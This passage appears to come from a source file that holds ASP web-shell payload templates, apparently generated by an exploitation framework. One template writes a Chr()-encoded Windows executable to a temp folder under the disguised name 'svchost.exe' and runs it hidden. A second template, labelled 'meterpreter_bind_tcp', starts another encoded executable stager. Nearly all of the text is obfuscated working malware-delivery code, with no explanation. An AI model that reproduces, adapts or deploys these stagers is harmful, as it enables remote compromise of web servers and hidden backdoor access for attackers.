gfoN=gfoN&Chr(34)&Chr(102)&Chr(97)&Chr(108)&Chr(115)&Chr(101)&Chr(34)&Chr(62)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(62)&Chr(13)&Chr(10)&Chr(60)
gfoN=gfoN&Chr(47)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(62)&Chr(80)&Chr(65)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)
Dim ThLcAvIdcDPMT
Set ThLcAvIdcDPMT = CreateObject("Scripting.FileSystemObject")
Dim YNAfoozDU
Dim xvsvDtFw
Dim FOZvNqgdeJYk
Dim yVCTYRnuLnnhN
Set xvsvDtFw = ThLcAvIdcDPMT.GetSpecialFolder(2)
yVCTYRnuLnnhN = xvsvDtFw & "\\" & ThLcAvIdcDPMT.GetTempName()
ThLcAvIdcDPMT.CreateFolder(yVCTYRnuLnnhN)
FOZvNqgdeJYk = yVCTYRnuLnnhN & "\\" & "svchost.exe"
Set YNAfoozDU = ThLcAvIdcDPMT.CreateTextFile(FOZvNqgdeJYk,2,0)
YNAfoozDU.Write gfoN
YNAfoozDU.Close
Dim khMWEvtchZA
Set khMWEvtchZA = CreateObject("Wscript.Shell")
khMWEvtchZA.run FOZvNqgdeJYk, 0, false
End Sub
NrMYDilU
%>
"""

meterpreter_bind_tcp = """
<%
Sub DNPAUOmddZViB()
GqnqCn=Chr(77)&Chr(90)&Chr(144)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(31)&Chr(186)&Chr(14)&Chr(0)&Chr(180)&Chr(9)&Chr(205)&Chr(33)&Chr(184)&Chr(1)&Chr(76)&Chr(205)&Chr(33)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(99)&Chr(97)&Chr(110)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(98)&Chr(101)
GqnqCn=GqnqCn&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(68)&Chr(79)&Chr(83)&Chr(32)&Chr(109)&Chr(111)&Chr(100)&Chr(101)&Chr(46)&Chr(13)&Chr(13)&Chr(10)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(154)&Chr(70)&Chr(50)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(172)&Chr(97)&Chr(181)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(189)&Chr(97)&Chr(191)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(171)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(136)&Chr(61)&Chr(83)&Chr(97)&Chr(172)&Chr(251)&Chr(40)&Chr(97)&Chr(175)&Chr(251)&Chr(41)&Chr(97)&Chr(230)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(162)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)&Chr(177)&Chr(169)&Chr(185)&Chr(97)&Chr(174)&Chr(251)&Chr(40)&Chr(97)
GqnqCn=GqnqCn&Chr(82)&Chr(105)&Chr(99)&Chr(104)&Chr(175)&Chr(251)&Chr(40)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(76)&Chr(1)&Chr(4)&Chr(0)&Chr(176)&Chr(41)&Chr(247)&Chr(74)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(0)&Chr(3)&Chr(1)&Chr(11)&Chr(1)&Chr(9)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(44)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(202)&Chr(107)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(149)&Chr(0)&Chr(0)&Chr(40)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(146)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(116)&Chr(101)&Chr(120)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(98)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(96)&Chr(46)&Chr(114)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(162)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(46)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(0)&Chr(0)&Chr(0)&Chr(252)&Chr(23)&Chr(0)&Chr(0)&Chr(0)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(192)&Chr(46)&Chr(114)&Chr(115)&Chr(114)&Chr(99)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(180)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(194)&Chr(16)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(5)&Chr(232)&Chr(209)&Chr(6)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(30)&Chr(5)&Chr(0)&Chr(0)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(96)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(93)&Chr(195)&Chr(106)&Chr(88)&Chr(104)&Chr(208)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(128)&Chr(21)&Chr(0)&Chr(0)&Chr(51)&Chr(246)&Chr(137)&Chr(117)&Chr(252)&Chr(141)&Chr(69)&Chr(152)&Chr(80)&Chr(255)&Chr(21)&Chr(4)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(254)&Chr(95)&Chr(137)&Chr(125)
GqnqCn=GqnqCn&Chr(252)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(5)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(161)&Chr(60)&Chr(0)&Chr(64)&Chr(0)&Chr(129)&Chr(184)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(39)&Chr(185)&Chr(11)&Chr(1)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(136)&Chr(24)&Chr(0)&Chr(64)&Chr(0)&Chr(117)&Chr(25)&Chr(131)&Chr(184)&Chr(116)&Chr(0)&Chr(64)&Chr(0)&Chr(14)&Chr(118)&Chr(16)&Chr(51)&Chr(201)&Chr(57)&Chr(176)&Chr(232)&Chr(0)&Chr(64)&Chr(0)&Chr(15)&Chr(149)&Chr(193)&Chr(137)&Chr(77)&Chr(228)&Chr(235)&Chr(3)&Chr(137)&Chr(117)&Chr(228)&Chr(51)&Chr(219)&Chr(67)&Chr(83)&Chr(232)&Chr(232)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(28)&Chr(232)&Chr(88)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(73)&Chr(19)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(16)&Chr(232)&Chr(71)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(220)&Chr(14)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(252)&Chr(232)&Chr(128)&Chr(12)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(27)&Chr(232)&Chr(95)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(255)&Chr(21)&Chr(0)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(45)&Chr(11)&Chr(0)&Chr(0)&Chr(163)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(232)&Chr(104)&Chr(10)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(8)&Chr(232)&Chr(57)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(223)&Chr(7)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(125)&Chr(8)&Chr(106)&Chr(9)&Chr(232)&Chr(40)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(83)&Chr(232)&Chr(224)&Chr(1)&Chr(0)&Chr(0)&Chr(89)
GqnqCn=GqnqCn&Chr(59)&Chr(198)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(22)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(93)&Chr(7)&Chr(0)&Chr(0)&Chr(132)&Chr(93)&Chr(196)&Chr(116)&Chr(6)&Chr(15)&Chr(183)&Chr(77)&Chr(200)&Chr(235)&Chr(3)&Chr(106)&Chr(10)&Chr(89)&Chr(81)&Chr(80)&Chr(86)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(193)&Chr(254)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(57)&Chr(117)&Chr(228)&Chr(117)&Chr(6)&Chr(80)&Chr(232)&Chr(87)&Chr(3)&Chr(0)&Chr(0)&Chr(232)&Chr(126)&Chr(3)&Chr(0)&Chr(0)&Chr(137)&Chr(125)&Chr(252)&Chr(235)&Chr(53)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(8)&Chr(139)&Chr(9)&Chr(137)&Chr(77)&Chr(220)&Chr(80)&Chr(81)&Chr(232)&Chr(185)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(139)&Chr(69)&Chr(220)&Chr(137)&Chr(69)&Chr(224)&Chr(131)&Chr(125)&Chr(228)&Chr(0)
GqnqCn=GqnqCn&Chr(117)&Chr(6)&Chr(80)&Chr(232)&Chr(58)&Chr(3)&Chr(0)&Chr(0)&Chr(232)&Chr(90)&Chr(3)&Chr(0)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(224)&Chr(235)&Chr(19)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(184)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(84)&Chr(20)&Chr(0)&Chr(0)&Chr(195)&Chr(232)&Chr(253)&Chr(21)&Chr(0)&Chr(0)&Chr(233)&Chr(120)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(0)&Chr(129)&Chr(56)&Chr(99)&Chr(115)&Chr(109)&Chr(224)&Chr(117)&Chr(42)&Chr(131)&Chr(120)&Chr(16)&Chr(3)&Chr(117)&Chr(36)&Chr(139)&Chr(64)&Chr(20)&Chr(61)&Chr(32)&Chr(5)&Chr(147)&Chr(25)&Chr(116)&Chr(21)&Chr(61)&Chr(33)&Chr(5)&Chr(147)&Chr(25)&Chr(116)
GqnqCn=GqnqCn&Chr(14)&Chr(61)&Chr(34)&Chr(5)&Chr(147)&Chr(25)&Chr(116)&Chr(7)&Chr(61)&Chr(0)&Chr(64)&Chr(153)&Chr(1)&Chr(117)&Chr(5)&Chr(232)&Chr(82)&Chr(22)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(104)&Chr(180)&Chr(17)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(191)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(16)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(129)&Chr(199)&Chr(232)&Chr(3)&Chr(0)&Chr(0)&Chr(129)&Chr(255)&Chr(96)&Chr(234)&Chr(0)&Chr(0)&Chr(119)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(222)&Chr(95)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(232)&Chr(169)&Chr(4)&Chr(0)&Chr(0)&Chr(255)&Chr(117)
GqnqCn=GqnqCn&Chr(8)&Chr(232)&Chr(246)&Chr(2)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(4)&Chr(160)&Chr(64)&Chr(0)&Chr(232)&Chr(20)&Chr(14)&Chr(0)&Chr(0)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(208)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(104)&Chr(40)&Chr(129)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(21)&Chr(104)&Chr(24)&Chr(129)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(24)&Chr(128)&Chr(64)&Chr(0)&Chr(204)&Chr(106)&Chr(8)&Chr(232)&Chr(97)
GqnqCn=GqnqCn&Chr(23)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(106)&Chr(8)&Chr(232)&Chr(126)&Chr(22)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(240)&Chr(235)&Chr(11)&Chr(139)&Chr(6)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(255)&Chr(208)&Chr(131)&Chr(198)&Chr(4)&Chr(59)&Chr(117)&Chr(8)&Chr(114)&Chr(240)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(51)&Chr(192)&Chr(235)&Chr(15)&Chr(133)&Chr(192)&Chr(117)&Chr(16)&Chr(139)&Chr(14)&Chr(133)&Chr(201)&Chr(116)&Chr(2)&Chr(255)&Chr(209)&Chr(131)&Chr(198)&Chr(4)&Chr(59)&Chr(117)&Chr(12)&Chr(114)&Chr(236)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(25)&Chr(104)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(213)
